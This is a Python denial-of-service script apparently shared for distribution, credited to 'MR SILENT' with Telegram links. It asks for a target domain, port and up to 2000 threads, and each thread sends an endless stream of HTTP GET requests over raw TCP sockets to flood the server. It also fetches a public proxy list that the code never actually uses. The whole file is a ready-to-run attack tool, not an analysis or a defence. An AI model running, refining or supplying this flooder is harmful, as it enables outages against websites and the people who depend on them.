import socket
import threading
import random
import requests
import time
import sys

# --- DEVELOPER INFO ---
# NAME: MR SILENT
# CHANNEL: https://t.me/+qINj6OQbKSlkYWRl
# CREDIT: t.me/mr_silent_71
# ----------------------

def banner():
    print("\033[1;31m" + r"""
   ______ _____    _     _____ 
  / ____/ ____|  | |   |___  |
 | |   | (___    | |      / / 
 | |    \___ \   | |     / /  
 | |________) |  | |___ / /   
  \____|_____/   |_____/_/    
 [ CS L7 ULTRA - DEVELOPED BY MR SILENT ]
    """ + "\033[1;m")

# অটো প্রক্সি স্ক্র্যাপার
def get_proxies():
    try:
        url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
        proxies = requests.get(url).text.split('\r\n')
        return proxies
    except:
        return []

# হাই-স্পিড অ্যাটাক ফাংশন
def launch_attack(target_ip, target_port, proxies):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15"
    ]

    while True:
        try:
            # সকেট কানেকশন তৈরি (Direct TCP Level pressure)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            
            # র্যান্ডম হেডার তৈরি
            header = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {random.choice(user_agents)}\r\nConnection: keep-alive\r\n\r\n"
            
            # ডেটা সেন্ডিং
            s.send(header.encode('ascii'))
            s.close()
            print(f"\033[1;32m[*] {target_ip} <--- ATTACK SENT BY MR SILENT")
        except:
            print("\033[1;31m[!] Server Busy or Connection Refused...")
            pass

def main():
    banner()
    target_link = input("\033[1;34m[?] Enter Target Domain (ex: google.com): \033[1;m")
    target_port = int(input("\033[1;34m[?] Enter Port (80/443): \033[1;m"))
    threads = int(input("\033[1;34m[?] Enter Power Level (Threads 100-2000): \033[1;m"))

    try:
        target_ip = socket.gethostbyname(target_link)
    except:
        print("Invalid Host!")
        return

    proxies = get_proxies()
    print(f"\033[1;33m[+] {len(proxies)} Proxies Loaded. Starting Mega Attack on {target_ip}...\033[1;m")
    time.sleep(2)

    for i in range(threads):
        t = threading.Thread(target=launch_attack, args=(target_ip, target_port, proxies))
        t.start()

if __name__ == "__main__":
    main()
    